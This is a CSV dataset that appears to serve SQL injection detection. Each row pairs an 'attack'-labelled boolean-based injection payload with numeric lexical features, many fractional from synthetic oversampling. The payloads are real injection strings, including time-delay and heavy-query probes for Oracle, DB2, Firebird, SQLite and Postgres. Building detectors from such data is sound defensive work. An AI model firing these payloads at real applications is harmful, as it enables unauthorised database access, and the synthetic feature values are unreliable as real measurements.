id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001935,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",nearest_attack_euclidean,R000108,2.0366145951549655,159.6998784277073,37.28751519653659,4.190182896390389,66.56242401731706,18.16266716190247,53.54981764156094,21.424969606926823,0.41668754840954253,0.1145123418234965,0.33470327832105007,0.1340968314459109,4.287515196536589,2.8499392138536472,0.8625455896097645,0.0,0.0,1.2875151965365883,0.0,7.1374544103902355,0.0,0.0,0.0,6.150060786146353,1.0,0.7124848034634119,0.28751519653658814,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.2875151965365882,1.0,1.4249696069268236,0.2875151965365882,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_001936,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000112,0.7711079003790178,388.7151605514049,31.0,3.2917814146632294,103.0,47.0,183.0415661869185,55.673594364486405,0.2650236315996207,0.12093311344837063,0.4708185342424391,0.14322472070956951,3.347188728972828,0.6528112710271721,0.0,0.0,0.0,3.0,0.0,37.67359436448641,0.0,0.0,1.0,13.0,0.836797182243207,0.16320281775679302,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_001937,attack,boolean,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",nearest_attack_euclidean,R000150,1.366260542887909,155.37489054802828,30.0,3.8213752875922844,71.20836981732391,8.0,54.305433942253636,21.861086788450727,0.4609312909747484,0.05165948775987525,0.3469811879962899,0.14042803326908643,4.0,0.0,0.0,0.0,1.0,2.0,0.0,7.861086788450726,1.9999999999999998,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.4652716971126818,0.5347283028873183,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001938,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000111,0.665377601223372,145.2583646268149,33.20786863184362,4.041427322989803,68.93246651731704,17.039343159218085,43.4944235821234,15.792131368156383,0.4706850658047188,0.11838353894638332,0.30206855699764207,0.10886283825125584,0.7921313681563833,0.0,2.0,0.0,1.0,2.0,0.0,5.623605895530851,0.0,0.2078686318436166,1.7921313681563833,5.0,0.7921313681563833,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001939,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,1.0188617423447048,142.4394555000198,30.0,3.757243333224013,43.39226859524218,18.34849364285997,55.611143357153225,25.08754990476442,0.30779573456788956,0.12836478168304524,0.38613209265559656,0.17770739109346861,0.0,0.0,2.0,0.0,0.0,1.0,0.0,12.087549904764419,0.0,1.7390562619044476,1.5218874761911045,9.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.2609437380955522,0.7390562619044477,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3047186904777615,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.304718690477761
SMOTE_001940,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000034,1.0963979600815015,156.66471994104006,29.642459637435635,3.748441924635895,84.2289934148815,9.43016145025746,45.29048435077238,17.71508072512873,0.534069988671872,0.059862163897390186,0.29096498017309813,0.11510286725763971,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.357540362564365,0.9999999999999998,0.0,3.4301614502574598,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001941,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000068,0.5029817640868928,217.10175714289426,35.2335285714327,3.760987903172402,63.934114285730786,31.182649999985557,88.70058571429809,33.284407142879836,0.2943891380662697,0.14398669570664294,0.40861705359815137,0.153007112628936,0.0,0.11676428571634878,2.0,0.0,0.0,1.8832357142836513,0.0,18.467057142865393,0.11676428571634873,1.1167642857163487,3.1167642857163487,10.350292857149046,0.0,0.11676428571634861,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.8832357142836513,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.233528571432697,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.116764285716348
SMOTE_001942,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo",nearest_attack_euclidean,R000046,0.12324919694063961,119.67121613428718,27.134243226857436,4.045977903300571,71.32218374445785,5.08054593611446,26.29533509908636,16.973151354628513,0.596094976660603,0.04238030378887636,0.21951991464167891,0.14200480490884168,3.026848645371487,0.0,0.0,0.0,1.0,1.0268486453714871,0.0,3.026848645371487,0.0,4.865756773142564,3.9463027092570258,2.026848645371487,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0268486453714871,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.026848645371487
SMOTE_001943,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000034,0.9283401347120198,123.15506956966797,29.38466975865191,3.8433540036888068,58.6933951730382,9.538325603370225,39.15400927595573,15.76933951730382,0.462471056748636,0.08390273334690392,0.32424162317117966,0.12938458673328052,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.0,0.6923348793259547,0.30766512067404506,1.692334879325955,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001944,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000028,0.5102562767027461,122.08360029190891,32.80557335279393,3.7738554916311067,41.666880233527124,15.0,48.41672005838178,17.0,0.3401222993706835,0.1231815269542812,0.39709044312684993,0.13960573054818537,3.0,0.0,2.0,1.0,0.0,1.0,0.0,9.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.1944266472060734,0.8055733527939266,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001945,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R000110,1.5679729202579809,51.879815967817365,20.43776755376763,3.5417537492157987,11.75107021507052,14.751070215070524,18.939907983908682,6.437767553767632,0.22663083936397704,0.28614717077766766,0.36112856003472193,0.12609342982363328,0.4377675537676311,0.0,2.0,0.0,0.0,1.437767553767631,0.0,2.0,0.0,0.0,0.5622324462323689,3.437767553767631,0.437767553767631,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.4377675537676311,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4377675537676313
SMOTE_001946,attack,boolean,-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,nearest_attack_euclidean,R000089,1.2354004472503644,380.6390772987817,28.885346012956877,3.1470384673188,83.8364993894798,57.11465398704312,186.98303925991104,52.70488466234771,0.22042299796183273,0.15002851866811615,0.4910830370421573,0.1384654463278938,0.5902306753045838,0.0,0.7048846623477081,0.0,0.0,2.0,0.0,38.819538649390836,0.0,0.0,0.0,13.295115337652293,0.2951153376522919,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.295115337652292,0.0,0.2951153376522919,0.0,1.0,0.7048846623477081,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.29511533765229
SMOTE_001947,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000118,0.47152660984140804,124.26097435671383,32.092378205410775,3.5054119670549992,37.630487178356915,10.461891027053861,56.16859615130305,20.0,0.3027619741360334,0.08445310323518594,0.4517742892704406,0.16101063335834007,2.369512821643088,2.722865383767684,0.0,1.0,0.0,1.092378205410772,0.0,10.722865383767685,1.092378205410772,0.0,1.0,2.092378205410772,1.0,0.907621794589228,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.907621794589228,0.0,0.0,0.0,1.0,0.09237820541077202,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001948,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000140,0.35019468967595385,116.45133529501564,28.943583088123045,3.7826187457249993,41.67700294252347,14.0,42.88716617624608,17.88716617624609,0.35762149570613744,0.12025036887303817,0.36843046848991057,0.15369766693091383,3.0,0.0,0.0,0.0,0.0,0.9435830881230443,0.0,9.0,0.943583088123044,1.0,3.0,0.9435830881230443,1.0,0.0,0.0,0.0,0.0,0.9435830881230441,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001949,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000126,0.15045375890218207,128.62952641425076,31.933734061657812,4.348446672003029,79.80120218497345,4.1325318766843715,29.530127506737486,15.165664845855465,0.6209710760276648,0.032017749498224723,0.22919855733679453,0.117812617137316,0.0,3.033132969171093,0.0,0.0,1.0,1.033132969171093,0.0,3.0993989075132795,0.06626593834218603,0.0,2.966867030828907,2.033132969171093,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.033132969171092985,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.033132969171093
SMOTE_001950,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,1.1101742458447255,142.66376041760054,31.915940104400136,4.019158121346232,68.83188020880027,8.638646701466712,46.277293402933424,18.915940104400136,0.48244693378906534,0.06051434725911825,0.3246442625650788,0.13239445638673766,1.0,0.0,2.0,0.0,1.0,1.0,0.0,7.0,0.6386467014667112,0.0,2.6386467014667114,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.3613532985332886,0.6386467014667113,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001951,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000147,1.2670549998679719,157.15411451620318,35.186889861772336,4.213241563106692,75.96722465443084,18.0,41.406555069113836,21.780334792658504,0.4832816590051098,0.11459256285573297,0.2636736158453384,0.13845216229381893,2.186889861772336,0.0,2.0,0.0,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.593444930886168,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.593444930886168,0.0,1.0,1.0,0.593444930886168,0.4065550691138321,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.593444930886168
SMOTE_001952,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000022,0.34181294291102166,348.75850627925286,30.32393536723079,3.268593274829051,80.97180610169237,49.90744703793406,164.27765888619783,53.6015942534286,0.23201868494290223,0.14319367347730436,0.4711849440751015,0.15360269750469197,0.0,3.9999999999999996,1.0,0.0,0.0,2.0462764810329697,0.0,34.0,1.9074470379340602,0.1388294430989092,0.0,13.509041291362669,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.046276481032969885,1.0,0.0,0.0,0.04627648103296983,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.444682227604362,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.490958708637333
SMOTE_001953,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000022,2.34029176102106,357.34205073448607,30.369358954803072,3.27126022347902,84.80166641243994,51.846794774015365,168.0629485028338,52.630641045196924,0.23699376896336427,0.1450431143120771,0.47042264599444855,0.14754047073011006,0.7387179096061455,2.522564180787709,0.6306410451969272,0.0,0.0,2.0,0.0,34.738717909606144,1.2612820903938544,0.0,0.0,13.369358954803074,0.3693589548030727,0.6306410451969273,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.369358954803073,0.0,0.3693589548030729,0.0,1.0,0.6306410451969272,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.369358954803072
SMOTE_001954,attack,boolean,1' in boolean mode  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #,nearest_attack_euclidean,R000036,2.1812271447282385,349.89476681592134,31.447383407960675,3.268335699996514,87.96060874378372,47.828924888058985,164.72369170398034,49.381541480098306,0.251325975917463,0.13671846264982226,0.4707864665260234,0.14116909490669133,0.7236917039803379,1.1052331840786485,0.2763082960196621,0.0,0.0,1.2763082960196621,0.0,34.723691703980336,0.5526165920393242,0.0,0.0,11.552616592039325,0.7236917039803378,0.2763082960196621,0.0,0.7236917039803379,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.2763082960196621,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.276308296019664
SMOTE_001955,attack,boolean," end and   (  ""xksk""  =  ""xksk",nearest_attack_euclidean,R000019,0.5073997911337649,35.212780083589976,12.194595435822706,2.9595296838154543,13.891400414925208,1.303195020897494,14.149387967168956,5.868796680598333,0.43408679114422927,0.016707628473044828,0.38253891371605925,0.16666666666666666,0.0,3.108599585074791,0.1085995850747914,0.0,0.0,1.1085995850747914,0.0,1.5429979253739567,0.0,0.0,0.0,1.2171991701495832,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.1085995850747915,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1085995850747912
SMOTE_001956,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,1.3381453759246322,111.62488859487206,31.23212694212458,3.7470737265243197,37.470753178022036,16.72237800146526,43.94150635604408,13.49025105934068,0.3517703343704072,0.13860741556398581,0.38199296538218197,0.12762928468342497,0.0,0.0,2.0,0.0,1.0,2.0,0.0,5.98700141245424,0.0,0.7483751765567799,0.74837517655678,5.25162482344322,0.0,0.0,1.0,0.0,0.0,1.0,0.74837517655678,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001957,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000056,0.9008649891537117,81.24680952725845,25.070517007788126,3.6150552734254378,21.77644387792055,13.776443877920547,32.65866326752329,13.035258503894063,0.27123394897902664,0.17080661408475897,0.39716884141938086,0.16079059551683353,4.0,0.0,0.2588146259735157,0.0,0.0,1.7411853740264842,0.0,5.035258503894063,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.7411853740264842,0.2588146259735158,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001958,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000106,0.4294749692875124,40.000000000000014,13.908543449417458,2.7304676534425836,2.0,12.0,20.0,6.000000000000002,0.04999999999999999,0.3,0.5,0.15,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001959,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000097,0.8647362664019173,37.31341652512539,15.104472175041792,2.908431699085325,2.0,12.0,17.76118043760448,5.552236087520898,0.054797470490847544,0.3287848229450852,0.4680168633943498,0.1484008431697175,0.7761180437604482,0.22388195623955176,1.0,0.0,0.0,1.0,0.0,2.552236087520896,0.0,0.0,0.0,2.0,0.7761180437604482,0.2238819562395517,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001960,attack,boolean,"1' where 6417  =  6417 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000079,0.15013704790569438,254.1932447579756,38.0,3.830416358913793,76.0,35.19324475797559,100.0,43.0,0.2990034938987143,0.13839782679186283,0.3934256498667293,0.1691730294426936,1.0,0.0,2.0,0.0,0.0,2.0,0.0,22.0,0.0,2.0,4.0,14.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_001961,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,0.4410389593125603,154.9023882946355,32.59756443445667,4.2478039169788575,90.42679122097663,9.40243556554333,38.07316150811555,17.0,0.5824664081297376,0.060640588538937876,0.2462883019024134,0.1106047014289111,4.0,0.0,0.0,0.0,1.0,1.1341451885144431,0.0,4.0,0.0,0.0,3.402435565543329,2.134145188514443,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
